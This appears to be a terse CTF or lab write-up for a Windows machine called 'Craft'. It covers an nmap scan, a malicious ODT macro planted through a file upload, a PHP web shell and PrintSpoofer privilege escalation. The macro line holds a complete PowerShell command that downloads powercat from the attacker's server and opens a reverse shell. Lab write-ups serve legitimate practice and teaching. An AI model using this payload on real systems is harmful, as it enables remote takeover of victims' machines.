Nmap scan report for 192.168.168.169
Host is up (0.042s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 24 12:10:06 2026 -- 1 IP address (1 host up) scanned in 21.37 seconds

file upload only accepts ODT
<img width="1375" height="655" alt="image" src="https://github.com/user-attachments/assets/9a786d54-b3b2-41f5-bea1-c855203a7d4d" />

managed to submit .php.odt file but when clicked it downloads instead of opening php exploits
<img width="895" height="402" alt="image" src="https://github.com/user-attachments/assets/fe03fb7c-d8b7-4cb6-b8be-ad61be342818" />

trying to set up odt file macro
<img width="503" height="507" alt="image" src="https://github.com/user-attachments/assets/53660e95-fc69-4826-a953-943f3242e865" />

customize and put open document
<img width="797" height="546" alt="image" src="https://github.com/user-attachments/assets/69d944b1-3fa2-44ea-91da-a31d14d9d4f6" />

poc
<img width="669" height="138" alt="image" src="https://github.com/user-attachments/assets/4bc92d52-5301-4e4f-ab56-8eeb43cc0c3a" />
<img width="878" height="171" alt="image" src="https://github.com/user-attachments/assets/486c7ffd-0b77-4ffd-835a-81c202a2fc6b" />

use this macro, make sure u have powercat.ps1 in ur http server for the victim to download
 Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.154/powercat.ps1');powercat -c 192.168.45.154 -p 135 -e powershell")
 <img width="1464" height="187" alt="image" src="https://github.com/user-attachments/assets/60e01c30-eff4-4666-82f5-9e5cc2377eab" />

local is at C:\Users\thecybergeek\Desktop\local.txt
<img width="538" height="44" alt="image" src="https://github.com/user-attachments/assets/65d8ce11-4be3-496c-ae48-ee429ace1efd" />

apache has administrator. so i found the root web folder and uploaded a php file
<img width="801" height="345" alt="image" src="https://github.com/user-attachments/assets/68f070c9-29b0-4ef6-b283-c88a54b59521" />

used ivan php
<img width="1377" height="297" alt="image" src="https://github.com/user-attachments/assets/ad0f102b-c40e-490c-9b6c-21215279d229" />

seimpersonatepriv
<img width="867" height="219" alt="image" src="https://github.com/user-attachments/assets/f67477ea-0a7a-40af-91c8-24d26351fa81" />

PRINTSPOOFERRR
<img width="698" height="441" alt="image" src="https://github.com/user-attachments/assets/134817c6-705b-47ab-9324-463326c82be2" />


